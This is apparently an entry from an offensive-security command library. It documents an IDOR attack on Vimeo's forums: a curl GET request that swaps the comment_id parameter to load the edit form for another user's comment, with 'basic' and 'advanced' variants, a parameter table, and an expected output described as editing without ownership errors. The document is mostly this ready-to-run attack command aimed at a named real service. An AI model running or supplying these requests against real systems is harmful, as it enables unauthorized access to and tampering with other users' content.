---
data: >-
  curl -X GET
  "https://vimeo.com/forums/wanted_and_offered/topic:130606?comment_id=13010972&is_sticky=0&action=comment_edit_form"
  -H "X-Requested-With: XMLHttpRequest" -H "Referer:
  https://vimeo.com/forums/wanted_and_offered/topic:130606" -H "Cookie:
  [auth_cookies]"
tags:
  - get
  - idor
  - vimeo
type: command
output: HTML edit form for unauthorized comment
executor: curl
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:23.405Z'
id: f8971aac-54c5-404b-96d3-9eeeed7c694a
verified: false
validated: true
submitted: true
---
# vimeo-get-modified-comment-edit-form

## Command

```bash
curl -X GET "https://vimeo.com/forums/wanted_and_offered/topic:130606?comment_id=13010972&is_sticky=0&action=comment_edit_form" \
  -H "X-Requested-With: XMLHttpRequest" \
  -H "Referer: https://vimeo.com/forums/wanted_and_offered/topic:130606" \
  -H "Cookie: [insert full authentication cookies]"
```

## Description

This command loads the edit form for a different user's comment by modifying the comment_id parameter, exploiting the IDOR vulnerability to gain unauthorized access.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| comment_id | Modified ID of target comment (e.g., 13010972) | Yes |
| is_sticky | Sticky flag (usually 0) | No |
| action | Set to comment_edit_form | Yes |
| Cookie | Full session cookies for authentication | Yes |

## Examples

### Basic Usage

```bash
curl -X GET "https://vimeo.com/forums/wanted_and_offered/topic:130606?comment_id=13010972&is_sticky=0&action=comment_edit_form" -H "X-Requested-With: XMLHttpRequest" -H "Cookie: [cookies]"
```

### Advanced Usage

With silent mode to suppress progress:

```bash
curl -s -X GET "https://vimeo.com/forums/wanted_and_offered/topic:130606?comment_id=13010972&is_sticky=0&action=comment_edit_form" -H "X-Requested-With: XMLHttpRequest" -H "Cookie: [cookies]"
```

## Expected Output

HTML form for the targeted comment, allowing editing without ownership errors.

## Related

- [[commands/vimeo-get-comment-edit-form]]
- [[procedures/Modify-Comment-ID-for-IDOR-Access]]
